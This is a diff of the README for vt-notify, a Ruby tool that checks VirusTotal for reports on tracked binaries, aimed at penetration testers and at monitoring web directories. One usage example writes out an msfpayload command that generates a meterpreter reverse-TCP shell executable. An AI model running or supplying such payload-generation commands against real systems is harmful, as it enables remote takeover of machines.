@@ -1,11 +1,12 @@
+
 Virus Total Notifier
 =========
 
-This project was originally created to set up a notification so when Virus Total had a report for a specific binary (One used in a pen test or otherwise) the pentester could be notified via log or email. It runs in an infinite loop and does not check files or hashes that have already been detected, however it does continue to re-check hashes that haven't been.
+This project was originally created to notify the user when Virus Total had a report for a specific binary (i.e. one used in a penetration test or otherwise) the penetration tester could be notified via log or email. It runs in an infinite loop and does not check files or hashes that have already been detected by the program; It does, however, continue to re-check hashes that haven't been detected.
 
-However, this can also be used as a detection mechanism. Target it at your web-root or other sensitive directory and become notified when anything that has a report on Virus Total is added to your directory.
+This program can also be used as a detection mechanism. Target it towards your web-root or other sensitive directory and it will notify you when anything that has a report on Virus Total is added to your directory.
 
-The script doesn't have anything Linux specific in it, so it should be portable anywhere Ruby is installed.
+The script doesn't have anything OS specific in it, so it should be portable anywhere Ruby is installed.
 
 
 Usage
@@ -13,16 +14,16 @@ Usage
 
 ```
 Usage: vt-notify [options]
-    -e EMAIL // email address of who to notify upon detection, will only log to file if not specified
-    -m SMTPSERVER // smtp server to relay email through
-    -s FILENAME // file name of binary to keep track of
-    -S SHA1 // single SHA1 to keep track of
-    -f FILENAME // file containing sha1 hashes of files to keep track of
-    -d DIRECTORY // directory of binaries keep track of
-    -a APIKEYFILENAME // file contianing API key hash on first line, defaults to apikey.txt
-    -l LOGFILENAME // file to write/read positive entries to/from, defaults to results.log
-    -i INTERVAL // how often VT is checked, defaults to every 10 minutes
-    -h
+	-e EMAIL // email address of who to notify upon detection
+	-m SMTPSERVER // smtp server to relay email through
+	-s FILENAME // binary file to track
+	-S SHA1 // single SHA1 hash to track
+	-f FILENAME // file contaning SHA1 hashes to track
+	-d DIRECTORY // directory of binary files to track
+	-a APIKEYFILENAME // file contianing API key hash on first line, defaults to apikey.txt
+	-l LOGFILENAME // file to write/read positive entries to/from, defaults to results.log
+	-i INTERVAL // how often VT is checked, defaults to every 10 minutes
+	-h // this useful help text
 ```
 
 For example, the following takes all 500+ files in the hackarmoury repository, SHA1 hashes them and checks them against Virus Total. The ones that have been submitted (even those that have a 0 detection rate) are reported via email to justanotheruser@gmail.com via the Gmail email servers. 
@@ -34,7 +35,7 @@ Another example is taking a freshly generated 'evil.exe' from Metasploit:
 ```
 ./msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.92.100 X > evil.exe
 ```
-And setting up vt-notify to just check on it, with the notifications going to the same gmail account, checking ever 20 seconds:
+And setting up vt-notify to just check on it, with the notifications going to the same gmail account, checking every 20 seconds:
 ```
 ./vt-notify.rb -s evil.exe -e justanotheruser@gmail.com -m gmail-smtp-in.l.google.com -i 20
 ```
@@ -57,3 +58,7 @@ Not found:   0
 Found:       1
 ```
 Hash lists are also supported in hash-per-line files (-f) and single SHA1 (-S), however I don't have the ability to support multiple singles on the command line (-S) or (-s)
+
+### Credits
+Credit to [@mubix](https://github.com/mubix) for the original vt-notify script  
+Credit to [@ashtinblanchard](https://github.com/AshtinBlanchard) for bringing it forward
